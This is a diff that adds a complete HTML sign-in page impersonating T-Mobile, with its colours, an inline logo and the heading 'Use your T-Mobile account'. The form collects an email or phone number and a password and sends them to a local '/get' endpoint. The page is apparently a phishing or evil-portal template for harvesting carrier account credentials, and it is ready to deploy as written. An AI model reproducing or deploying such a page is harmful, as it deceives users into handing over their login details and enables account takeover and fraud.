@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #e20074;
+  color: #fff;
+}
+
+.container {
+  max-width: 400px;
+  margin: 50px auto;
+  padding: 20px; 
+  border-radius: 5px;
+}
+
+h1 {
+  font-size: 24px;
+  font-weight: 300;
+  margin-top: 0;
+  text-align: center; 
+}
+
+h2 {
+  font-size: 16px;
+  font-weight: 200;
+  text-align: center;
+}
+
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  box-sizing: border-box;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+input[type="submit"] {
+  width: 100%;
+  background-color: #fff;
+  color: #e20074;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+input[type="submit"]:hover {
+  background-color: #ddd;
+}
+
+.logo {
+  display: block;
+  max-width: 130px; 
+  margin: 0 auto 30px auto; 
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- T-Mobile SVG logo -->
+  <svg class="logo" id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 122.88 122.88">
+    <defs>
+      <style>.cls-1{fill:#e20074;}.cls-2{fill:#fff;}</style>
+    </defs>
+    <title>t-mobile</title>
+    <polygon class="cls-1" points="0 122.88 122.88 122.88 122.88 0 0 0 0 122.88 0 122.88"/>
+    <polygon class="cls-2" points="25.52 75.62 25.52 57.9 34.74 57.9 43.24 57.9 43.24 75.62 25.52 75.62 25.52 75.62"/>
+    <polygon class="cls-2" points="79.64 75.62 79.64 57.9 89.8 57.9 97.36 57.9 97.36 75.62 79.64 75.62 79.64 75.62"/>
+    <path class="cls-2" d="M96.41,17.72H26.47l-.95,31,4.73.71c.94-9.22,3.31-15.83,7.09-20.32,4-4.49,9.68-7.09,17-7.33V86.25c0,5.67-.71,9.22-2.36,10.87-1.42,1.42-3.78,2.37-7.09,2.6-.95,0-2.6.24-5,.24v5H83.18v-5a25.52,25.52,0,0,1-5-.24c-3.31-.23-5.67-1.18-7.09-2.6-1.66-1.65-2.36-5.43-2.36-10.87V22c7.32.23,13,2.6,17,7.32,4,4.49,6.38,11.11,7.09,20.33l4.72-.71-1.18-31.2Z"/>
+  </svg>
+
+  <h1>Sign in</h1>
+
+  <h2>Use your T-Mobile account</h2>
+
+  <form id="login-form" action="/get">
+    <input type="text" name="email" placeholder="Email or phone number" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <input type="submit" value="Sign In">
+  </form>
+
+</div>
+
+</body>
+</html>
